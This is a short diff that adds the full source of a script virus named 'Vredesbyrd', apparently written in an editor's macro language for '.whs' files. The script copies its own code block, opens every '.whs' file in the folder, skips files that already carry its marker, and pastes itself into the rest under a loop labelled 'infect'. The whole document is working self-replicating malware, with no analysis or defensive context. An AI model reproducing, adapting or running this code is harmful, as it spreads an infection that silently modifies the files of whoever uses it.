@@ -1,0 +1,23 @@
+//WH.Vredesbyrd
+
+Open ".\*.whs"
+NextObj
+
+Block2 196
+Copy
+Close
+
+Label infect
+
+Find "Vredesbyrd"
+IfFound
+Close
+else
+Paste
+Save
+Close
+EndIf
+
+ExitIfNoFilesOpen
+
+JumpTo infect
